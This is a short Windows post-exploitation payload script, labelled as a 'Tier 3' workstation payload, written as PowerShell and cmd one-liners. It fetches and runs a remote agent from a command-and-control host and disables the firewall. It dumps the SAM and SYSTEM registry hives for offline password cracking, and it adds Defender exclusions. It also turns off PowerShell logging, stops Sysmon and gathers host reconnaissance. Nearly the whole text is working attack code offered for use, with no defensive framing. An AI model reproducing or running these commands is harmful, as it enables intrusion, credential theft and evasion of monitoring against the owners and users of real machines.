# ============================================================
# WORKSTATION PRIMARY PAYLOAD - Tier 3 (Workstations)
# ============================================================
# C2 beacon + credential harvesting (quick wins)
# Target: Workstations (opportunistic access)
# ============================================================

# C2 BEACON: PowerShell download cradle (obfuscated)
$w=New-Object Net.WebClient;$s=$w.DownloadString('http://10.0.0.100:8080/agent.ps1');[scriptblock]::Create($s).Invoke()

# FIREWALL: Disable firewall via netsh (fast and effective)
cmd /c "netsh advfirewall set allprofiles state off"

# CREDENTIAL ACCESS: Dump SAM + SYSTEM hives (offline cracking)
cmd /c "reg save HKLM\SAM C:\ProgramData\s.dat /y & reg save HKLM\SYSTEM C:\ProgramData\sy.dat /y"

# DEFENSE EVASION: Add Defender exclusion paths
Add-MpPreference -ExclusionPath 'C:\ProgramData' -Force; Add-MpPreference -ExclusionPath $env:TEMP -Force; Add-MpPreference -ExclusionPath 'C:\Windows\Temp' -Force

# DEFENSE EVASION: Disable Script Block Logging + Module Logging
$sb='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'; $ml='HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging'; @($sb,$ml) | ForEach-Object { if(!(Test-Path $_)){New-Item -Path $_ -Force|Out-Null} }; Set-ItemProperty $sb -Name EnableScriptBlockLogging -Value 0 -Type DWord -Force; Set-ItemProperty $ml -Name EnableModuleLogging -Value 0 -Type DWord -Force

# SERVICE MANIPULATION: Disable Sysmon
cmd /c "sc stop Sysmon64 2>nul & sc config Sysmon64 start= disabled 2>nul & sc stop Sysmon 2>nul & sc config Sysmon start= disabled 2>nul"

# RECONNAISSANCE: Quick enumeration
$o=@(); $o+="=== $(hostname) / $(whoami) / $(Get-Date) ==="; $o+="=== ADMINS ==="; $o+=cmd /c "net localgroup Administrators"; $o+="=== NETWORK ==="; $o+=ipconfig /all; $o | Out-File C:\ProgramData\r.txt -Force
